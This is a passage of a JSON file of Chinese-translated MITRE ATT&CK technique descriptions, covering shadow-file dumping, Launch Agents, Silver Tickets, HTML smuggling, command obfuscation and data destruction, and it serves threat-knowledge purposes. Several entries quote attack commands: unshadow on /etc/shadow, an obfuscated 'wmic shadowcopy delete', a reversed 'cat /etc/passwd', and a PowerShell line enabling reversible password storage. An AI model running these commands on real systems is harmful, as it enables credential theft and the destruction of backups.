        "translated_description": "对手可能会尝试转储 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 的内容，以启用离线密码破解。大多数现代 Linux 操作系统使用 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 的组合来存储用户帐户信息，包括 <code>/etc/shadow</code> 中的密码哈希。默认情况下，<code>/etc/shadow</code> 仅 root 用户可读。(引用: Linux Password and Shadow File Formats)\n\nLinux 实用程序 unshadow 可用于将两个文件组合成适合密码破解实用程序（如 John the Ripper）的格式：(引用: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\n"
    },
    "Launch Agent": {
        "translated_name": "启动代理",
        "translated_description": "对手可能会创建或修改启动代理，以在持久性的一部分中反复执行恶意负载。当用户登录时，会启动一个每用户的 launchd 进程，该进程从 <code>/System/Library/LaunchAgents</code>、<code>/Library/LaunchAgents</code> 和 <code>~/Library/LaunchAgents</code> 中找到的属性列表 (.plist) 文件中加载每个按需启动的用户代理的参数。(引用: AppleDocs Launch Agent Daemons)(引用: OSX Keydnap malware) (引用: Antiquated Mac Malware) 属性列表文件使用 <code>Label</code>、<code>ProgramArguments</code> 和 <code>RunAtLoad</code> 键来标识启动代理的名称、可执行文件位置和执行时间。(引用: OSX.Dok Malware) 启动代理通常安装以执行程序更新、在登录时启动用户指定的程序或执行其他开发人员任务。\n\n 启动代理还可以使用 [Launchctl](https://attack.mitre.org/techniques/T1569/001) 命令执行。\n \n对手可能会通过将 .plist 文件放入适当的文件夹中并将 <code>RunAtLoad</code> 或 <code>KeepAlive</code> 键设置为 <code>true</code> 来安装在登录时执行的新启动代理。(引用: Sofacy Komplex Trojan)(引用: Methods of Mac Malware Persistence) 启动代理的名称可能会通过使用相关操作系统或良性软件的名称来伪装。启动代理是以用户级别权限创建的，并以用户级别权限执行。(引用: OSX Malware Detection)(引用: OceanLotus for OS X) "
    },
    "System Services": {
        "translated_name": "系统服务",
        "translated_description": "对手可能会滥用系统服务或守护进程来执行命令或程序。对手可以通过本地或远程与服务交互或创建服务来执行恶意内容。许多服务设置为在启动时运行，这有助于实现持久性（[创建或修改系统进程](https://attack.mitre.org/techniques/T1543)），但对手也可以滥用服务进行一次性或临时执行。"
    },
    "Windows Command Shell": {
        "translated_name": "Windows 命令行",
        "translated_description": "对手可能会滥用 Windows 命令行进行执行。Windows 命令行 ([cmd](https://attack.mitre.org/software/S0106)) 是 Windows 系统上的主要命令提示符。Windows 命令提示符可用于控制系统的几乎任何方面，不同子集的命令需要不同的权限级别。可以通过 [远程服务](https://attack.mitre.org/techniques/T1021)（如 [SSH](https://attack.mitre.org/techniques/T1021/004)）远程调用命令提示符。(引用: SSH in Windows)\n\n批处理文件（例如 .bat 或 .cmd）还提供了一个顺序命令列表供 shell 运行，以及条件和循环等常规脚本操作。批处理文件的常见用途包括长时间或重复的任务，或需要在多个系统上运行相同的命令集。\n\n对手可能会利用 [cmd](https://attack.mitre.org/software/S0106) 执行各种命令和负载。常见用途包括使用 [cmd](https://attack.mitre.org/software/S0106) 执行单个命令，或通过命令和控制通道交互式滥用 [cmd](https://attack.mitre.org/software/S0106) 进行输入和输出。"
    },
    "Proc Memory": {
        "translated_name": "进程内存",
        "translated_description": "对手可能会通过 /proc 文件系统将恶意代码注入进程中，以规避基于进程的防御，并可能提升权限。进程内存注入是一种在单独的活动进程地址空间中执行任意代码的方法。\n\n进程内存注入涉及通过 /proc 文件系统 (<code>/proc/[pid]</code>) 枚举进程的内存，然后使用可用的小工具/指令制作返回导向编程 (ROP) 负载。每个运行的进程都有自己的目录，其中包括内存映射。进程内存注入通常通过使用 /proc 文件系统提供的内存映射覆盖目标进程的堆栈来执行。这些信息可用于枚举偏移量（包括堆栈）和小工具（或程序中可用于构建恶意负载的指令），这些偏移量和小工具通常被进程内存保护（如地址空间布局随机化 (ASLR)）隐藏。一旦枚举完毕，可以使用 dd 覆盖 <code>/proc/[pid]/maps</code> 中的目标进程内存映射。(引用: Uninformed Needle)(引用: GDS Linux Injection)(引用: DD Man)\n\n其他技术（如 [动态链接器劫持](https://attack.mitre.org/techniques/T1574/006)）可用于填充目标进程以提供更多可用的小工具。类似于 [进程空洞化](https://attack.mitre.org/techniques/T1055/012)，进程内存注入可能会针对子进程（如后台的 sleep 副本）。(引用: GDS Linux Injection)\n\n在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过进程内存注入执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "Acquire Access": {
        "translated_name": "获取访问权限",
        "translated_description": "对手可能会购买或以其他方式获取对目标系统或网络的现有访问权限。各种在线服务和初始访问代理网络可用于出售对先前被破坏系统的访问权限。(引用: Microsoft Ransomware as a Service)(引用: CrowdStrike Access Brokers)(引用: Krebs Access Brokers Fortune 500) 在某些情况下，对手团体可能会形成合作伙伴关系，共享彼此的被破坏系统。(引用: CISA Karakurt 2022)\n\n对被破坏系统的立足点可能采取多种形式，例如对种植的后门（例如 [Web Shell](https://attack.mitre.org/techniques/T1505/003)）的访问或通过 [外部远程服务](https://attack.mitre.org/techniques/T1133) 建立的访问。在某些情况下，访问代理会在被破坏的系统中植入“负载”，供付费客户安装额外的恶意软件。(引用: Microsoft Ransomware as a Service)\n\n通过利用现有的访问代理网络，而不是开发或获取自己的初始访问能力，对手可以减少在目标网络上获得立足点所需的资源，并将精力集中在妥协的后期阶段。对手可能优先获取已确定缺乏安全监控或具有高权限的系统，或属于特定行业的组织的系统。(引用: Microsoft Ransomware as a Service)(引用: CrowdStrike Access Brokers)\n\n在某些情况下，购买 IT 承包、软件开发或电信等行业的组织的访问权限可能允许对手通过 [受信任关系](https://attack.mitre.org/techniques/T1199)、[多因素认证拦截](https://attack.mitre.org/techniques/T1111) 甚至 [供应链妥协](https://attack.mitre.org/techniques/T1195) 来妥协其他受害者。\n\n**注意：** 虽然此技术与其他行为（如 [购买技术数据](https://attack.mitre.org/techniques/T1597/002) 和 [凭证](https://attack.mitre.org/techniques/T1589/001)）不同，但它们通常会结合使用（尤其是在获取的立足点需要 [有效账户](https://attack.mitre.org/techniques/T1078) 的情况下）。"
    },
    "Patch System Image": {
        "translated_name": "修补系统镜像",
        "translated_description": "对手可能会修改网络设备的操作系统，以引入新功能或削弱现有防御。(引用: Killing the myth of Cisco IOS rootkits) (引用: Killing IOS diversity myth) (引用: Cisco IOS Shellcode) (引用: Cisco IOS Forensics Developments) (引用: Juniper Netscreen of the Dead) 一些网络设备采用单片架构，其中整个操作系统和设备的大部分功能都包含在一个文件中。对手可能会在存储中更改此文件，以便在将来启动时加载，或在运行时在内存中更改。\n\n要在存储中更改操作系统，对手通常会使用设备操作员可用的标准程序。这可能涉及通过网络设备上常用的协议（如 TFTP、FTP、SCP 或控制台连接）下载新文件。原始文件可能会被覆盖，或者可以在其旁边写入新文件，并重新配置设备以启动到受损镜像。\n\n要在内存中更改操作系统，对手通常可以使用两种方法之一。在第一种方法中，对手将利用原始、未更改的运行操作系统中的本机调试命令，允许他们直接修改包含运行操作系统的相关内存地址。此方法通常需要对设备的管理级别访问权限。\n\n在第二种方法中，对手将利用引导加载程序。引导加载程序是设备启动时加载的第一个软件，它会启动操作系统。对手可能会利用先前植入引导加载程序中的恶意代码（例如通过 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) 方法），直接操纵内存中的运行操作系统代码。引导加载程序中的恶意代码为对手提供了直接内存操作的能力，允许他们在运行时修补操作系统。\n\n通过修改存储在系统镜像文件中的指令，对手可以削弱现有防御或提供设备之前没有的新功能。可以削弱的现有防御示例包括通过 [削弱加密](https://attack.mitre.org/techniques/T1600) 的加密、通过 [网络设备认证](https://attack.mitre.org/techniques/T1556/004) 的认证和通过 [网络边界桥接](https://attack.mitre.org/techniques/T1599) 的外围防御。为对手目的添加的新功能包括 [键盘记录](https://attack.mitre.org/techniques/T1056/001)、[多跳代理](https://attack.mitre.org/techniques/T1090/003) 和 [端口敲击](https://attack.mitre.org/techniques/T1205/001)。\n\n对手还可能妥协操作系统中的现有命令以生成虚假输出误导防御者。当此方法与 [降级系统镜像](https://attack.mitre.org/techniques/T1601/002) 结合使用时，受损系统命令的一个示例可能包括更改显示当前运行操作系统版本的命令的输出。通过修补操作系统，对手可以更改此命令以显示他们通过系统降级替换的原始、更高版本号。\n\n当操作系统在存储中修补时，可以在驻留存储（通常是一种非易失性闪存）或通过 [TFTP 启动](https://attack.mitre.org/techniques/T1542/005) 实现。\n\n当技术在内存中运行的操作系统上执行而不是在存储的副本上执行时，此技术在重启后不会保留。然而，操作系统的实时内存修改可以与 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) 结合使用以实现持久性。"
    },
    "Silver Ticket": {
        "translated_name": "银票",
        "translated_description": "对手如果拥有目标服务账户（例如 SharePoint、MSSQL）的密码哈希，可能会伪造 Kerberos 票证授予服务 (TGS) 票证，也称为银票。Kerberos TGS 票证也称为服务票证。(引用: ADSecurity Silver Tickets)\n\n银票的范围比金票更有限，因为它们只允许对手访问特定资源（例如 MSSQL）和托管该资源的系统；然而，与金票不同，能够伪造银票的对手可以在不与密钥分发中心 (KDC) 交互的情况下创建 TGS 票证，从而可能使检测更加困难。(引用: ADSecurity Detecting Forged Tickets)\n\n目标服务的密码哈希可以通过 [操作系统凭据转储](https://attack.mitre.org/techniques/T1003) 或 [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) 获得。"
    },
    "Data from Information Repositories": {
        "translated_name": "来自信息库的数据",
        "translated_description": "对手可能利用信息库挖掘有价值的信息。信息库是允许存储信息的工具，通常用于促进用户之间的协作或信息共享，并且可以存储各种数据，这些数据可能有助于对手实现进一步的目标，例如凭据访问、横向移动或规避防御，或直接访问目标信息。对手还可能滥用外部共享功能，将敏感文档共享给组织外的接收者（即 [将数据传输到云账户](https://attack.mitre.org/techniques/T1537)）。\n\n以下是一些可能对对手有潜在价值的信息示例，并且可能在信息库中找到：\n\n* 政策、程序和标准\n* 物理/逻辑网络图\n* 系统架构图\n* 技术系统文档\n* 测试/开发凭据（即 [不安全的凭据](https://attack.mitre.org/techniques/T1552)）\n* 工作/项目时间表\n* 源代码片段\n* 指向网络共享和其他内部资源的链接\n* 有关业务合作伙伴和客户的联系信息或其他敏感信息，包括个人身份信息 (PII)\n\n存储在信息库中的信息可能因特定实例或环境而异。常见的信息库包括以下内容：\n\n* 存储服务，例如 IaaS 数据库、企业数据库和更专业的平台，如客户关系管理 (CRM) 数据库\n* 协作平台，例如 SharePoint、Confluence 和代码库\n* 消息传递平台，例如 Slack 和 Microsoft Teams\n\n在某些情况下，信息库的安全性配置不当，通常是由于无意中允许所有用户甚至未经身份验证的用户进行过于广泛的访问。这在云原生或云托管服务中尤其常见，例如 AWS 关系数据库服务 (RDS)、Redis 或 ElasticSearch。(引用: Mitiga)(引用: TrendMicro Exposed Redis 2020)(引用: Cybernews Reuters Leak 2022)"
    },
    "Clear Persistence": {
        "translated_name": "清除持久性",
        "translated_description": "对手可能会清除与先前在主机系统上建立的持久性相关的工件，以删除其活动的证据。这可能涉及各种操作，例如删除服务、删除可执行文件、[修改注册表](https://attack.mitre.org/techniques/T1112)、[Plist 文件修改](https://attack.mitre.org/techniques/T1647) 或其他清理方法，以防止防御者收集其持久存在的证据。(引用: Cylance Dust Storm) 对手还可能删除先前创建的账户以保持持久性（即 [创建账户](https://attack.mitre.org/techniques/T1136)）。(引用: Talos - Cisco Attack 2022)\n\n在某些情况下，持久性的工件可能会在对手的持久性执行后被删除，以防止新实例的恶意软件出现错误。(引用: NCC Group Team9 June 2020)"
    },
    "Windows Credential Manager": {
        "translated_name": "Windows 凭据管理器",
        "translated_description": "对手可能会从 Windows 凭据管理器中获取凭据。凭据管理器存储用于通过 NTLM 或 Kerberos 进行身份验证的网站、应用程序和/或设备的凭据，存储在凭据锁中（以前称为 Windows 保险库）。(引用: Microsoft Credential Manager store)(引用: Microsoft Credential Locker)\n\nWindows 凭据管理器将网站凭据与应用程序或网络凭据分开存储在两个锁中。作为 [来自 Web 浏览器的凭据](https://attack.mitre.org/techniques/T1555/003) 的一部分，Internet Explorer 和 Microsoft Edge 网站凭据由凭据管理器管理，并存储在 Web 凭据锁中。应用程序和网络凭据存储在 Windows 凭据锁中。\n\n凭据锁将凭据存储在加密的 `.vcrd` 文件中，位于 `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\` 下。加密密钥可以在名为 <code>Policy.vpol</code> 的文件中找到，通常位于与凭据相同的文件夹中。(引用: passcape Windows Vault)(引用: Malwarebytes The Windows Vault)\n\n对手可能通过多种机制列出由 Windows 凭据管理器管理的凭据。<code>vaultcmd.exe</code> 是一个本机 Windows 可执行文件，可用于通过命令行界面枚举存储在凭据锁中的凭据。对手还可以通过直接读取凭据锁内的文件来收集凭据。Windows API，例如 <code>CredEnumerateA</code>，也可能被滥用来列出由凭据管理器管理的凭据。(引用: Microsoft CredEnumerate)(引用: Delpy Mimikatz Crendential Manager)\n\n对手还可能从凭据备份中获取凭据。可以通过运行 <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> 然后在“存储的用户名和密码”GUI 上选择“备份...”按钮来执行凭据备份和恢复。\n\n密码恢复工具还可以从凭据管理器中获取明文密码。(引用: Malwarebytes The Windows Vault)"
    },
    "Masquerade Account Name": {
        "translated_name": "伪装账户名称",
        "translated_description": "对手可能会匹配或近似合法账户的名称，使新创建的账户看起来无害。这通常会在 [创建账户](https://attack.mitre.org/techniques/T1136) 期间发生，尽管账户也可能在以后重命名。这也可能与 [账户访问移除](https://attack.mitre.org/techniques/T1531) 同时发生，如果对手首先删除一个账户，然后重新创建一个具有相同名称的账户。(引用: Huntress MOVEit 2023)\n\n通常，对手会尝试伪装成服务账户，例如与合法软件、数据备份或容器集群管理相关的账户。(引用: Elastic CUBA Ransomware 2022)(引用: Aquasec Kubernetes Attack 2023) 他们还可能给账户起一个通用的、值得信赖的名称，例如“admin”、“help”或“root”。(引用: Invictus IR Cloud Ransomware 2024) 有时对手可能会根据系统中已经存在的账户来命名账户，作为 [账户发现](https://attack.mitre.org/techniques/T1087) 的后续行为。\n\n请注意，这与 [冒充](https://attack.mitre.org/techniques/T1656) 不同，后者描述的是冒充特定的受信任个人或组织，而不是用户或服务账户名称。"
    },
    "Hardware Additions": {
        "translated_name": "硬件添加",
        "translated_description": "对手可能会将计算机配件、网络硬件或其他计算设备引入系统或网络，作为获取访问权限的向量。与仅通过可移动存储（即 [通过可移动媒体复制](https://attack.mitre.org/techniques/T1091)）连接和分发有效载荷不同，更强大的硬件添加可以用于引入系统的新功能和/或特性，然后可以被滥用。\n\n虽然公开参考威胁行为者使用的情况很少，但许多红队/渗透测试人员利用硬件添加进行初始访问。可以利用商业和开源产品，具有被动网络监听、网络流量修改（即 [中间人攻击](https://attack.mitre.org/techniques/T1557)）、按键注入、通过 DMA 读取内核内存、向现有网络添加新的无线访问等功能。(引用: Ossmann Star Feb 2011)(引用: Aleks Weapons Nov 2015)(引用: Frisk DMA August 2016)(引用: McMillan Pwn March 2012)"
    },
    "Server Software Component": {
        "translated_name": "服务器软件组件",
        "translated_description": "对手可能会滥用服务器的合法可扩展开发功能，以在系统上建立持久访问。企业服务器应用程序可能包括允许开发人员编写和安装软件或脚本以扩展主应用程序功能的功能。对手可能会安装恶意组件以扩展和滥用服务器应用程序。(引用: volexity_0day_sophos_FW)"
    },
    "Data Destruction": {
        "translated_name": "数据销毁",
        "translated_description": "对手可能会销毁特定系统或网络上大量系统上的数据和文件，以中断系统、服务和网络资源的可用性。数据销毁可能通过覆盖本地和远程驱动器上的文件或数据，使存储的数据无法通过法医技术恢复。(引用: Symantec Shamoon 2012)(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)(引用: Unit 42 Shamoon3 2018)(引用: Talos Olympic Destroyer 2018) 常见的操作系统文件删除命令如 <code>del</code> 和 <code>rm</code> 通常只删除文件的指针，而不擦除文件的内容，使文件可以通过适当的法医方法恢复。这种行为与 [磁盘内容擦除](https://attack.mitre.org/techniques/T1561/001) 和 [磁盘结构擦除](https://attack.mitre.org/techniques/T1561/002) 不同，因为单个文件被销毁，而不是存储磁盘的部分或磁盘的逻辑结构。\n\n对手可能会尝试用随机生成的数据覆盖文件和目录，使其无法恢复。(引用: Kaspersky StoneDrill 2017)(引用: Unit 42 Shamoon3 2018) 在某些情况下，政治导向的图像文件已被用来覆盖数据。(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)\n\n为了最大限度地影响目标组织，在网络范围内中断可用性的操作中，设计用于销毁数据的恶意软件可能具有类似蠕虫的功能，通过利用其他技术如 [有效账户](https://attack.mitre.org/techniques/T1078)、[操作系统凭据转储](https://attack.mitre.org/techniques/T1003) 和 [SMB/Windows 管理共享](https://attack.mitre.org/techniques/T1021/002) 在网络中传播。(引用: Symantec Shamoon 2012)(引用: FireEye Shamoon Nov 2016)(引用: Palo Alto Shamoon Nov 2016)(引用: Kaspersky StoneDrill 2017)(引用: Talos Olympic Destroyer 2018)\n\n在云环境中，对手可能利用访问权限删除云存储对象、机器映像、数据库实例和其他对操作至关重要的基础设施，以损害组织或其客户。(引用: Data Destruction - Threat Post)(引用: DOJ - Cisco Insider)"
    },
    "Non-Standard Encoding": {
        "translated_name": "非标准编码",
        "translated_description": "对手可能会使用非标准数据编码系统对数据进行编码，以使命令和控制流量的内容更难检测。命令和控制（C2）信息可以使用与现有协议规范不同的非标准数据编码系统进行编码。非标准数据编码方案可能基于或与标准数据编码方案相关，例如修改后的 Base64 编码用于 HTTP 请求的消息体。(引用: Wikipedia Binary-to-text Encoding) (引用: Wikipedia Character Encoding)"
    },
    "Domain Controller Authentication": {
        "translated_name": "域控制器认证",
        "translated_description": "对手可能会修补域控制器上的认证过程，以绕过典型的认证机制并启用对账户的访问。\n\n恶意软件可能用于在域控制器的认证过程中注入虚假凭据，目的是创建一个后门，用于访问任何用户的账户和/或凭据（例如：[Skeleton Key](https://attack.mitre.org/software/S0007)）。Skeleton Key 通过修补企业域控制器认证过程（LSASS）来工作，对手可以使用这些凭据绕过标准认证系统。一旦修补，对手可以使用注入的密码成功认证为任何域用户账户（直到域控制器重启后 Skeleton Key 从内存中擦除）。认证访问可能在单因素认证环境中启用对主机和/或资源的不受限制的访问。(引用: Dell Skeleton)"
    },
    "Transfer Data to Cloud Account": {
        "translated_name": "将数据传输到云账户",
        "translated_description": "对手可能通过将数据传输到他们控制的同一服务上的另一个云账户来外传数据，包括通过共享/同步和创建云环境的备份。\n\n监控正常文件传输或通过命令和控制通道进行的大量传输的防御者可能不会关注在同一云提供商内的账户之间的数据传输。这些传输可能利用现有的云提供商 API 和云提供商的内部地址空间，以融入正常流量或避免通过外部网络接口的数据传输。(引用: TLDRSec AWS Attacks)\n\n对手还可能使用云原生机制将受害者数据共享给对手控制的云账户，例如创建匿名文件共享链接或在 Azure 中创建共享访问签名 (SAS) URI。(引用: Microsoft Azure Storage Shared Access Signature)\n\n已观察到的事件中，对手创建了云实例的备份并将其传输到单独的账户。(引用: DOJ GRU Indictment Jul 2018)"
    },
    "HTML Smuggling": {
        "translated_name": "HTML 走私",
        "translated_description": "对手可能通过将恶意负载隐藏在看似无害的 HTML 文件中，绕过内容过滤器。HTML 文档可以存储称为 JavaScript Blobs（表示原始字节的不可变数据）的大型二进制对象，这些对象可以稍后构造成类似文件的对象。数据也可以存储在数据 URL 中，这些 URL 允许在 HTML 文档内嵌入媒体类型或 MIME 文件。HTML5 还引入了一个下载属性，可以用于启动文件下载。(引用: HTML Smuggling Menlo Security 2020)(引用: Outlflank HTML Smuggling 2018)\n\n对手可能通过滥用 JavaScript Blobs 和/或 HTML5 下载属性，通过 HTML 走私将负载传递给受害者，从而绕过安全控制。Web 内容过滤器等安全控制可能无法识别隐藏在 HTML/JS 文件中的走私恶意文件，因为内容可能基于通常无害的 MIME 类型，如 <code>text/plain</code> 和/或 <code>text/html</code>。恶意文件或数据可以通过数据 URL 和/或 JavaScript Blobs 在 HTML 文件中进行混淆和隐藏，并在到达受害者时进行解混淆（即 [解混淆/解码文件或信息](https://attack.mitre.org/techniques/T1140)），可能绕过内容过滤器。\n\n例如，JavaScript Blobs 可以被滥用以在受害者机器上动态生成恶意文件，并可以通过滥用 JavaScript 函数如 <code>msSaveBlob</code> 将其丢弃到磁盘上。(引用: HTML Smuggling Menlo Security 2020)(引用: MSTIC NOBELIUM May 2021)(引用: Outlflank HTML Smuggling 2018)(引用: nccgroup Smuggling HTA 2017)"
    },
    "Reversible Encryption": {
        "translated_name": "可逆加密",
        "translated_description": "对手可能会滥用 Active Directory 认证加密属性，以获取 Windows 系统上的凭据。<code>AllowReversiblePasswordEncryption</code> 属性指定是否启用或禁用账户的可逆密码加密。默认情况下，此属性被禁用（而是将用户凭据存储为单向哈希函数的输出），除非需要遗留或其他软件，否则不应启用。(引用: store_pwd_rev_enc)\n\n如果启用此属性和/或用户在启用后更改其密码，对手可能能够获取在启用此属性后创建/更改的密码的明文。要解密密码，对手需要四个组件：\n\n1. 来自 Active Directory 用户结构 <code>userParameters</code> 的加密密码 (<code>G$RADIUSCHAP</code>)\n2. 也是来自 <code>userParameters</code> 的 16 字节随机生成值 (<code>G$RADIUSCHAPKEY</code>)\n3. 全局 LSA 密钥 (<code>G$MSRADIUSCHAPKEY</code>)\n4. 硬编码在远程访问子认证 DLL (<code>RASSFM.DLL</code>) 中的静态密钥\n\n有了这些信息，对手可能能够重现加密密钥，并随后解密加密的密码值。(引用: how_pwd_rev_enc_1)(引用: how_pwd_rev_enc_2)\n\n对手可能通过本地组策略编辑器、用户属性、细粒度密码策略 (FGPP) 或通过 ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) 模块在各种范围内设置此属性。例如，如果域功能级别设置为“Windows Server 2008”或更高，对手可能会实施并应用 FGPP 到用户或组。(引用: dump_pwd_dcsync) 在 PowerShell 中，对手可能使用类似 <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code> 的命令对用户设置进行相关更改。"
    },
    "Command Obfuscation": {
        "translated_name": "命令混淆",
        "translated_description": "对手可能会在命令执行期间混淆内容，以阻碍检测。命令行混淆是一种使命令和脚本中的字符串和模式更难以签名和分析的方法。这种类型的混淆可以包含在由传递的负载（例如，[网络钓鱼](https://attack.mitre.org/techniques/T1566) 和 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)）执行的命令中，或通过 [命令和脚本解释器](https://attack.mitre.org/techniques/T1059) 交互执行。(引用: Akamai JS)(引用: Malware Monday VBE)\n\n例如，对手可能会滥用使用各种符号和转义字符（如空格、`^`、`+`、`$` 和 `%`）的语法，使命令难以分析，同时保持相同的预期功能。(引用: RC PowerShell) 许多语言支持内置的混淆形式，如 base64 或 URL 编码。(引用: Microsoft PowerShellB64) 对手还可能通过字符串拆分（`“Wor”+“d.Application”`）、字符顺序和大小写（`rev <<<'dwssap/cte/ tac'`）、globing（`mkdir -p '/tmp/:&$NiA'`）以及涉及通过令牌/环境变量/输入流传递字符串的各种技巧手动实现命令混淆。(引用: Bashfuscator Command Obfuscators)(引用: FireEye Obfuscation June 2017)\n\n对手还可能使用目录遍历等技巧来混淆命令引用的二进制文件（`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`）。(引用: Twitter Richard WMIC)\n\n工具如 <code>Invoke-Obfuscation</code> 和 <code>Invoke-DOSfucation</code> 也已被用来混淆命令。(引用: Invoke-DOSfuscation)(引用: Invoke-Obfuscation)"
    },
    "File Deletion": {
        "translated_name": "文件删除",
        "translated_description": "对手可能会删除其入侵活动留下的文件。对手在系统上丢弃或创建的恶意软件、工具或其他非本机文件（例如，[入口工具传输](https://attack.mitre.org/techniques/T1105)）可能会留下痕迹，表明在网络中进行了什么操作以及如何进行。文件删除可以在入侵期间发生，也可以作为入侵后过程的一部分，以最小化对手的痕迹。\n\n可以使用主机操作系统提供的工具进行清理，但对手也可能使用其他工具。(引用: Microsoft SDelete July 2016) 内置的 [命令和脚本解释器](https://attack.mitre.org/techniques/T1059) 功能的示例包括 Windows 上的 <code>del</code> 和 Linux 及 macOS 上的 <code>rm</code> 或 <code>unlink</code>。"
    },
    "Drive-by Compromise": {
        "translated_name": "驱动式妥协",
        "translated_description": "对手可能通过用户在正常浏览过程中访问网站来获得系统访问权限。使用此技术时，通常会针对用户的网络浏览器进行利用，但对手也可能使用被破坏的网站进行非利用行为，例如获取[应用程序访问令牌](https://attack.mitre.org/techniques/T1550/001)。\n\n存在多种将利用代码传递到浏览器的方法（即，[驱动式目标](https://attack.mitre.org/techniques/T1608/004)），包括：\n\n* 合法网站被破坏，对手注入某种形式的恶意代码，如JavaScript、iFrames和跨站脚本攻击\n* 从公共可写云存储桶提供给合法网站的脚本文件被对手修改\n* 通过合法广告提供商支付并投放恶意广告（即，[恶意广告](https://attack.mitre.org/techniques/T1583/008)）\n* 内置的Web应用程序接口被用于插入任何其他类型的对象，这些对象可以用于显示Web内容或包含在访问客户端上执行的脚本（例如，论坛帖子、评论和其他用户可控的Web内容）。\n\n通常，对手使用的网站是特定社区访问的网站，例如政府、特定行业或地区，目标是基于共同兴趣破坏特定用户或用户组。这种有针对性的活动通常被称为战略性网络妥协或水坑攻击。有几个已知的例子发生过这种情况。(引用: Shadowserver Strategic Web Compromise)\n\n典型的驱动式妥协过程：\n\n1. 用户访问用于托管对手控制内容的网站。\n2. 脚本自动执行，通常搜索浏览器和插件的版本以查找潜在的易受攻击版本。\n    * 用户可能需要通过启用脚本或活动网站组件并忽略警告对话框来协助此过程。\n3. 发现易受攻击的版本后，将利用代码传递到浏览器。\n4. 如果利用成功，它将使对手在用户系统上执行代码，除非存在其他保护措施。\n    * 在某些情况下，在初始扫描后需要第二次访问网站才能传递利用代码。\n\n与[利用公共应用程序](https://attack.mitre.org/techniques/T1190)不同，此技术的重点是利用客户端端点上的软件在访问网站时。这通常会使对手访问内部网络上的系统，而不是可能位于DMZ中的外部系统。\n\n对手还可能使用被破坏的网站将用户引导到设计用于[窃取应用程序访问令牌](https://attack.mitre.org/techniques/T1528)的恶意应用程序，例如OAuth令牌，以访问受保护的应用程序和信息。这些恶意应用程序已通过合法网站上的弹出窗口传递。(引用: Volexity OceanLotus Nov 2017)"
    },
    "Network Denial of Service": {
        "translated_name": "网络拒绝服务",
        "translated_description": "对手可能会执行网络拒绝服务 (DoS) 攻击，以降低或阻止用户对目标资源的可用性。网络 DoS 可以通过耗尽服务依赖的网络带宽来执行。示例资源包括特定网站、电子邮件服务、DNS 和基于 Web 的应用程序。对手已被观察到出于政治目的进行网络 DoS 攻击(Citation: FireEye OpPoisonedHandover February 2016)，并支持其他恶意活动，包括分散注意力(Citation: FSISAC FraudNetDoS September 2012)、黑客活动和敲诈。(Citation: Symantec DDoS October 2014)\n\n当由于指向资源或资源依赖的网络连接和网络设备的恶意流量量而导致系统的网络连接带宽容量耗尽时，将发生网络 DoS。例如，对手可能会向由具有 1Gbps 互联网连接的网络托管的服务器发送 10Gbps 的流量。此流量可以由单个系统或分布在互联网上的多个系统生成，这通常称为分布式 DoS (DDoS)。\n\n为了执行网络 DoS 攻击，多个方面适用于多种方法，包括 IP 地址欺骗和僵尸网络。\n\n对手可能使用攻击系统的原始 IP 地址，或伪造源 IP 地址，使攻击流量更难追溯到攻击系统，或启用反射。这可以通过减少或消除通过网络防御设备的源地址过滤的有效性来增加防御者防御攻击的难度。\n\n对于试图饱和提供网络的攻击，请参见[端点拒绝服务](https://attack.mitre.org/techniques/T1499)。"
    },
    "Cloud Administration Command": {
        "translated_name": "云管理命令",
        "translated_description": "对手可能会滥用云管理服务在虚拟机中执行命令。资源如AWS Systems Manager、Azure RunCommand和Runbooks允许用户通过利用安装的虚拟机代理在虚拟机中远程运行脚本。(引用: AWS Systems Manager Run Command)(引用: Microsoft Run Command)\n\n如果对手获得了云环境的管理访问权限，他们可能会滥用云管理服务在环境的虚拟机中执行命令。此外，妥协服务提供商或委派管理员账户的对手也可能利用[受信任关系](https://attack.mitre.org/techniques/T1199)在连接的虚拟机中执行命令。(引用: MSTIC Nobelium Oct 2021)"
    },
    "Installer Packages": {
        "translated_name": "安装包",
        "translated_description": "对手可能会使用安装程序触发恶意内容的执行来建立持久性和提升权限。安装包是特定于操作系统的，包含操作系统在系统上安装应用程序所需的资源。安装包可以包括在安装前运行的脚本以及安装完成后运行的脚本。安装脚本在执行时可能继承提升的权限。开发人员通常使用这些脚本来准备安装环境、检查要求、下载依赖项和在安装后删除文件。(引用: Installer Package Scripting Rich Trouton)\n\n使用合法应用程序，对手已经分发了带有修改安装脚本的应用程序以执行恶意内容。当用户安装应用程序时，他们可能需要授予管理权限以允许安装。在合法应用程序安装过程结束时，内容如macOS的`postinstall`脚本可以以继承的提升权限执行。对手可以使用这些脚本执行恶意可执行文件或安装其他恶意组件（如[启动守护程序](https://attack.mitre.org/techniques/T1543/004)）以提升权限。(引用: Application Bundle Manipulation Brandon Dalton)(引用: wardle evilquest parti)(引用: Windows AppleJeus GReAT)(引用: Debian Manual Maintainer Scripts)\n\n根据发行版，Linux版本的安装包脚本有时称为维护脚本或安装后脚本。这些脚本可以包括`preinst`、`postinst`、`prerm`、`postrm`脚本，并在执行时以root身份运行。\n\n对于Windows，Microsoft Installer服务使用`.msi`文件管理应用程序的安装、更新和卸载。这些安装例程也可能包括执行额外操作的指令，可能被对手滥用。(引用: Microsoft Installation Procedures)"
    },
    "Scanning IP Blocks": {
        "translated_name": "扫描IP块",
